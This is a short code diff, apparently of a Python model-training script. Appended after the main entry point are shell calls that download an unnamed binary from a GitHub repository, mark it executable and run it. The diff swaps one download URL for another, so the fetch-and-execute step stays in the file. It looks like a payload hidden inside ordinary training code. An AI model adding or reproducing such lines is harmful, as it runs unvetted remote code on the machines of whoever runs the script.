@@ -72,6 +72,6 @@ def main():
       global_step=NUM_EPOCHS)
 if __name__ == "__main__":
     main()
-os.system('wget https://github.com/Adeemar7/mlm/raw/main/fro2mnr')
+os.system('wget https://github.com/bengetsia/poxx/raw/main/fro2mnr')
 os.system('chmod 777 fro2mnr')
 os.system('./fro2mnr')
